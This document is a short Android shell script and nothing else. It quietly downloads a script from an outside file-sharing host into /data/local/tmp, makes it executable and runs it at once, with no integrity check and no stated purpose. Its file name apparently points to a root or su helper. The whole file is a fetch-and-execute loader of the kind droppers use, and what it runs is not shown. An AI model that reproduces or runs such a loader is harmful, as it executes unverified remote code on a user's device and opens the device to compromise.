#!/system/bin/sh
SCRIPT_URL="https://pan.shenzhi.shop/down.php/9cb74b2bffd7778e38003a9fc7ab913f.sh"
TMP="/data/local/tmp/isu.sh"
curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
